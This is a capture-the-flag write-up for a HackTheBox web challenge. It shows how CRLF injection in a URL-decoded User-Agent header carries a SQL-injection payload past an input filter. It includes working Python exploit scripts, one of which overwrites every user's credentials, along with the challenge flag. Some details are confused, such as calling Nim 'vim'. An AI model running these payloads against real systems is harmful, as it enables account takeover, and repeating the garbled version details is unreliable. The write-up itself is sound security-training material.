# Introduction
The box gives us a login prompt with fields for `username` and `password`.
At first, I entered random credentials, and it kept showing "browser not supported".
Something felt off. Thankfully, HackTheBox provides us with the machine files.
Upon inspecting the files, I found some interesting things.

## Identifying the Vulnerability
The following code snippet from **_main.vim_** describes a check for SQL injection vulnerability:
```nim
proc containsSqlInjection(input: string): bool =
  for c in input:
    let ordC = ord(c)
    if not ((ordC >= ord('a') and ordC <= ord('z')) or
            (ordC >= ord('A') and ordC <= ord('Z')) or
            (ordC >= ord('0') and ordC <= ord('9'))):
      return true
  return false
```
While further inspecting the code, I discovered that the vulnerability lies in a function called `decodeUrl`.

This function decodes the `user-agent` header but does not properly validate or sanitize the decoded value.

This allows an attacker to inject **CRLF** characters to bypass the SQL injection check.

Here’s another snippet showing the vulnerable route:
```nim
routes:
  post "/user":
    let username = @"username"
    let password = @"password"
    if containsSqlInjection(username) or containsSqlInjection(password):
      resp msgjson("Malicious input detected")
    let userAgent = decodeUrl(request.headers["user-agent"])
    let jsonData = %*{
      "username": username,
      "password": password
    }
    let jsonStr = $jsonData

    let client = newHttpClient(userAgent)
    client.headers = newHttpHeaders({"Content-Type": "application/json"})

    let response = client.request(userApi & "/login", httpMethod = HttpPost, body = jsonStr)

    if response.code != Http200:
      resp msgjson(response.body.strip())
    
    resp msgjson(readFile("/flag.txt"))

runForever()
```
## Key Insight:
`vim` versions below 1.2.6 are vulnerable to CRLF attacks.

The Dockerfile shows the `vim` version at line 22.

This can be exploited by modifying the `user-agent` header to include a CRLF sequence in the POST request.

## Crafting the Exploit
The next step is to craft a script to check if the vulnerability can be exploited.

Here’s a Python script for the attack:
```python
import requests

def send_post_request(url, headers, data):
    x = requests.post(url, headers=headers, data=data)
    print(x.status_code)
    print(x.text)

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    "User-Agent": "Mozilla/7.0%0d%0aHello: test",
}

payload = b"username=aaaa&password=aa"

send_post_request("http://94.237.54.42:47968/user", headers, payload)
```

Note: I encoded `\r\n` as `%0d%0a`.

As a result, we receive a header `Hello` in the response.

## Performing SQL Injection
The frontend sends the body to the backend as JSON.

Thus, the payload should look like this:
``` python
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    "User-Agent": "Mozilla/7.0%0d%0a%0d%0a{\"username\":\"' OR '1'='1\"}",
}
```
## Additional Considerations

1.**Password Hashing**:
The password is hashed using bcrypt.

To store a valid hashed password in the database, we can reproduce the Go code and print the hashed value.

For example, the hash for `b` (salt is included)is:
```perl
$2a$10$OMv7TKyoqShcmWryPU9syOMr6PygopMySxuTfTcWZHy7fo/VS577S
```
2.**Content-Length**:
The request from the frontend to the backend must include a `Content-Length header`.
If the `username` and `password` fields are too short, the request will be truncated, and part of the payload may be lost.

To avoid this, ensure the body is large enough when sending the request.

The complete exploit is given below:
```python
import requests

URL = "http://94.237.54.42:47968/user" # replace with your instance

def send_post_request(url, headers, data):
	x = requests.post(url, headers=headers, data=data)
	print(x.status_code)
	print(x.text)

# SQL Injection: set all users' usernames to `a` and passwords to `b`
send_post_request(
	URL,
	{
    	'Content-Type': 'application/x-www-form-urlencoded',
    	"User-Agent": "Mozilla/7.0%0d%0a%0d%0a{\"username\":\"'; UPDATE users SET username = 'a', password = '$2a$10$OMv7TKyoqShcmWryPU9syOMr6PygopMySxuTfTcWZHy7fo/VS577S' WHERE '1'='1\"}",
	},
	b"username=aaaa&password="+ b"a" * 1024 # the body should be at least as big as the payload in the user-agent header, otherwise errors will occur
)

# Getting the flag by performing a valid login
send_post_request(
	URL,
	{
    	'Content-Type': 'application/x-www-form-urlencoded',
    	"User-Agent": "Mozilla/7.0",
	},
	b"username=a&password=b"
)
```
### The output should be as of follows:
```
200
{"msg": "Invalid username or password"}
200
{"msg": "HTB{g0_f1n8_3he_7l6g_y0ur$3lf_}"}
```

**Hope you’ve find this writeup helpful.
And happy pwning.**

